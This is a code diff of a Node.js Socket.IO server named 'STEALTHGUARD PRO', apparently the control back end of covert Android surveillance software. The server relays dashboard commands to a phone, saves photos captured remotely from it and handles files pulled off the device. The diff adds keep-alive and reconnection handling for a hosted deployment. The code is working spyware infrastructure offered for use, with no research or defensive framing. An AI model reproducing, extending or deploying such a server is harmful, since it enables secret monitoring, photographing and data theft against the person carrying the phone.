@@ -13,31 +13,46 @@ app.use(express.static('public'));
 const server = http.createServer(app);
 const io = new Server(server, {
     cors: { origin: "*", methods: ["GET", "POST"] },
-    maxHttpBufferSize: 1e8
+    maxHttpBufferSize: 1e8,
+    pingTimeout: 60000,
+    pingInterval: 25000
 });
 
 let androidSocket = null;
 let webSocket = null;
+
+// Keep-alive route for UptimeRobot
+app.get('/ping', (req, res) => res.send('pong'));
 
 io.on('connection', (socket) => {
     const isWeb = socket.handshake.query.type === 'web';
 
     if (isWeb) {
         webSocket = socket;
-        console.log(`[+] GUI CONNECTED`);
-        if (androidSocket) webSocket.emit('device_status', { connected: true });
+        console.log(`[+] Web Dashboard Connected`);
+        if (androidSocket) {
+            webSocket.emit('device_status', { connected: true });
+            androidSocket.emit('remote_command', { action: 'ping' }); // Wake up check
+        }
 
         socket.on('gui_command', (data) => {
-            if (androidSocket) {
+            if (androidSocket && androidSocket.connected) {
+                console.log(`[CMD] Sending ${data.action} to Android`);
                 androidSocket.emit('remote_command', data);
             } else {
-                socket.emit('server_log', "Error: Device Offline!");
+                socket.emit('server_log', "Error: Android Device Offline!");
             }
         });
 
     } else {
+        // Android Connection
+        if (androidSocket) {
+            console.log("[!] Replacing old Android socket with new one");
+            androidSocket.disconnect();
+        }
+
         androidSocket = socket;
-        console.log(`[+] ANDROID CONNECTED`);
+        console.log(`[+] ANDROID DEVICE CONNECTED: ${socket.id}`);
         if (webSocket) webSocket.emit('device_status', { connected: true });
 
         socket.onAny((event, data) => {
@@ -48,7 +63,6 @@ io.on('connection', (socket) => {
             try {
                 const buffer = Buffer.from(data.image, 'base64');
                 fs.writeFileSync('public/captured_photo.jpg', buffer);
-                console.log("[SAVED] New Remote Capture saved.");
                 if (webSocket) webSocket.emit('child_photo_taken', { success: true });
             } catch (e) { console.error("Save error:", e); }
         });
@@ -63,22 +77,26 @@ io.on('connection', (socket) => {
             } catch (e) { console.error("Download error:", e); }
         });
 
-        socket.on('disconnect', () => {
-            console.log("[-] ANDROID DISCONNECTED");
-            androidSocket = null;
-            if (webSocket) webSocket.emit('device_status', { connected: false });
+        socket.on('disconnect', (reason) => {
+            console.log(`[-] ANDROID DISCONNECTED: ${reason}`);
+            if (socket === androidSocket) {
+                androidSocket = null;
+                if (webSocket) webSocket.emit('device_status', { connected: false });
+            }
         });
     }
 
     socket.on('disconnect', () => {
-        if (socket === webSocket) webSocket = null;
+        if (socket === webSocket) {
+            console.log("[-] Web Dashboard Disconnected");
+            webSocket = null;
+        }
     });
 });
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`\n==========================================`);
-    console.log(`STEALTHGUARD PRO SERVER ACTIVE`);
-    console.log(`PORT: ${PORT}`);
-    console.log(`==========================================\n`);
+    console.log(`\nSTEALTHGUARD PRO SERVER ACTIVE`);
+    console.log(`URL: https://my-stealth-guard.onrender.com`);
+    console.log(`PORT: ${PORT}\n`);
 });
